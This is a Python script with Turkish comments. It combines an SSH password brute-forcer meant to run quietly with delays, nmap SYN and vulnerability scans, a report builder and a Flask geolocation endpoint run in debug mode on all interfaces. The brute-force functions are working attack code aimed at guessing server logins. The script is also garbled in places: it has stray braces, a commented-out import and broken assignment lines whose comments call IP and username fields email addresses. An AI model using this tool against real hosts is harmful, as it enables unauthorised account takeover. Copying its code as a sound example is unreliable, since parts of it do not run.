{
# import logging
import json
import os
import smtplib
import paramiko
import nmap
import random
import time
from datetime import datetime
from flask import Flask, request, jsonify

app = Flask(__name__)

# Loglama ayarları
def setup_logger(log_file):
    logging.basicConfig(
        filename=log_file,
        filemode='a',  # Dosyaya ekleme modu
        format='%(asctime)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )

# Log mesajı kaydetme
def log_event(event_message, level='info'):
    if level == 'info':
        logging.info(event_message)
    elif level == 'warning':
        logging.warning(event_message)
    elif level == 'error':
        logging.error(event_message)
    elif level == 'debug':
        logging.debug(event_message)

# Brute-force SSH saldırısı (sessiz ve zaman gecikmeli)
def brute_force_ssh(ip, username, wordlist, delay=2):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in wordlist:
        try:
            ssh.connect(ip, username=username, password=password, timeout=3)
            log_event(f"Başarılı SSH bağlantısı: {username}@{ip} - Şifre: {password}", level='info')
            ssh.close()
            return password  # Başarılı şifre bulundu
        except paramiko.AuthenticationException:
            log_event(f"SSH giriş başarısız: {password}", level='debug')
            time.sleep(delay)  # Her deneme arasında gecikme ekleniyor
            continue  # Şifre yanlış, denemeye devam et
        except Exception as e:
            log_event(f"SSH brute-force hatası: {e}", level='error')
            return None
    log_event("Brute-force saldırısı tamamlandı ancak doğru şifre bulunamadı.", level='error')
    return None

# Sessiz port taraması (SYN tarama)
def nmap_scan(ip):
    scanner = nmap.PortScanner()
    scanner.scan(ip, '1-1024', arguments='-sS')  # SYN taraması, gizli ve hızlı
    open_ports = []

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                if scanner[host][proto][port]['state'] == 'open':
                    service = scanner[host][proto][port]['name']
                    version = scanner[host][proto][port].get('version', 'unknown')
                    open_ports.append({'port': port, 'service': service, 'version': version})

    return open_ports

# Zafiyet taraması
def vulnerability_scan(ip):
    scanner = nmap.PortScanner()
    scanner.scan(ip, '1-1024', arguments='--script vuln')  # Zafiyet taraması betiği ekleniyor
    open_ports = []

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                if scanner[host][proto][port]['state'] == 'open':
                    service = scanner[host][proto][port]['name']
                    version = scanner[host][proto][port].get('version', 'unknown')
                    vulnerabilities = scanner[host][proto][port].get('script', {}).get('vuln', 'No vulnerabilities found')
                    open_ports.append({
                        'port': port, 
                        'service': service, 
                        'version': version,
                        'vulnerabilities': vulnerabilities
                    })

    return open_ports

# Sessiz rapor oluşturma ve kaydetme
def create_security_report(open_ports, found_cves, successful_attacks, test_durations, username):
    report = {
        'Report Generated At': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'Username': username,  # Kullanıcı adını ekle
        'Open Ports': open_ports,
        'Found CVEs': found_cves,
        'Successful Attacks': successful_attacks,
        'Test Durations': test_durations
    }
    return report

# Sessiz SSH brute-force saldırısı için hedef belirleme
def perform_brute_force_attack():
    target_ip"  # Hedef e-posta adresi
    username =usetname"  # Yönetici e-posta adresi
    wordlist_file = input("Wordlist dosyasının yolunu girin (şifre listesi): ")
    
    # Şifre listesini oku
    try:
        with open(wordlist_file, 'r') as file:
            wordlist = [line.strip() for line in file.readlines()]
    except IOError:
        log_event("Wordlist dosyası açılamadı.", level='error')
        return None

    # SSH brute-force saldırısı başlat
    return brute_force_ssh(target_ip, username, wordlist, delay=5)

# Geolocation
@app.route('/geolocation', methods=['POST'])
def get_geolocation():
    data = request.get_json()
    if 'latitude' in data and 'longitude' in data:
        latitude = data['latitude']
        longitude = data['longitude']
        log_event(f"Geolocation request received: Latitude {latitude}, Longitude {longitude}")
        return jsonify({
            'status': 'success',
            'latitude': latitude,
            'longitude': longitude
        })
    else:
        log_event("Invalid geolocation data received.", level='error')
        return jsonify({'status': 'error', 'message': 'Invalid data'}), 400

# Ana program (sessiz modda çalıştırma)
if __name__ == "__main__":
    log_file = 'security_tests.log'
    setup_logger(log_file)

    # Flask sunucusunu başlat
    app.run(host='0.0.0.0', port=5000, debug=True)
}

